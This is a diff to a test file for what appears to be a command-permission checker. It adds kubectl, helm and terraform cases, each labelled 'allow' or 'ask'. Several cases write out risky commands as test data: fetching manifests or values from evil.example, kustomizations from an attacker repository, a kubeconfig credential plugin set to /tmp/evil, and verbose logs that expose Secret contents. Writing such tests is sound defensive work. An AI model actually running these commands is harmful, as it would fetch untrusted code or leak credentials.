@@ -969,6 +969,29 @@ const startedCases: [source: string, decision: Decision, what: string][] = [
   ['terraform init -backend-config=address=https://evil.example/state', 'ask', 'a backend setting on the command line'],
   ['terraform fmt -check=false -recursive /home/me/other', 'ask', 'a check turned off, which writes'],
   ['terraform providers lock -net-mirror=https://evil.example/', 'ask', 'providers from a mirror the command names'],
+  // Round 44: dry runs that aren't, and more that prints, fetches or writes.
+  ['kubectl delete --raw /api/v1/namespaces/default/pods/x --dry-run=server', 'ask', 'a raw request, which ignores --dry-run'],
+  ['kubectl create --raw /api/v1/namespaces/default/pods -f pod.json --dry-run=client', 'ask', 'the same for create'],
+  [
+    "kubectl run x --image=busybox --restart=Never --detach-keys --dry-run=client -- sh -c 'id'",
+    'ask',
+    'an option the spec lacks, which takes --dry-run as its value',
+  ],
+  ['kubectl config view --minify', 'ask', "the kubeconfig, whose redaction leaves an OIDC provider's tokens"],
+  ['kubectl get secret x -v=8', 'ask', 'verbosity 8, which logs response bodies'],
+  ['kubectl describe secret x --v 10', 'ask', 'the same, whole'],
+  ['kubectl get pods -v=9', 'allow', 'response bodies of no Secret'],
+  ['kubectl get -f pod.yaml,https://evil.example/x.yaml', 'ask', 'a URL in a comma-separated -f'],
+  ['helm template . -f values.yaml,https://evil.example/v.yaml', 'ask', 'a URL in comma-separated values'],
+  ['kubectl get -k github.com/evil/repo//base', 'ask', 'a kustomization from a host with no scheme'],
+  ['kubectl apply -k deploy@evil.example:org/repo --dry-run=client', 'ask', 'one by SCP-style address'],
+  ['kubectl kustomize github.com/evil/repo', 'ask', 'the same, built'],
+  ['kubectl kustomize deploy/overlays/prod', 'allow', 'a local kustomization'],
+  ['helm upgrade rel ./chart --reuse-values --dry-run=server', 'ask', "a dry run printing the release's stored values"],
+  ['helm upgrade rel ./chart --reuse-values --dry-run=server --hide-secret', 'allow', 'the same with Secrets hidden'],
+  ['terraform workspace select -or-create prod2', 'ask', 'a workspace created in the backend'],
+  ['helm repo index ..', 'ask', 'an index written outside the project'],
+  ['helm dependency update ../other', 'ask', 'charts and a lock file written outside the project'],
   ['echo hi > out.txt', 'allow', 'writing inside the project, which resolves to an absolute path'],
   ['echo hi > /repo/out.txt', 'allow', 'writing inside the project by its absolute path'],
   ['echo hi > /etc/passwd', 'ask', 'writing outside the project'],
@@ -1406,6 +1429,18 @@ const inHomeCases: [source: string, decision: Decision, what: string][] = [
 
 /** Cases with an environment of their own. */
 const homeLinks: [source: string, decision: Decision, what: string, environment: Environment][] = [
+  [
+    'kubectl config set users.u.exec.command /tmp/evil',
+    'ask',
+    "a kubeconfig's credential plugin, from HOME",
+    { cwd: '/home/me', env: { HOME: '/home/me' } },
+  ],
+  [
+    'kubectl kuberc set --section=defaults --command=get --option=output=yaml',
+    'ask',
+    "kuberc's defaults, from HOME",
+    { cwd: '/home/me', env: { HOME: '/home/me' } },
+  ],
   [
     'echo x >> rc',
     'ask',
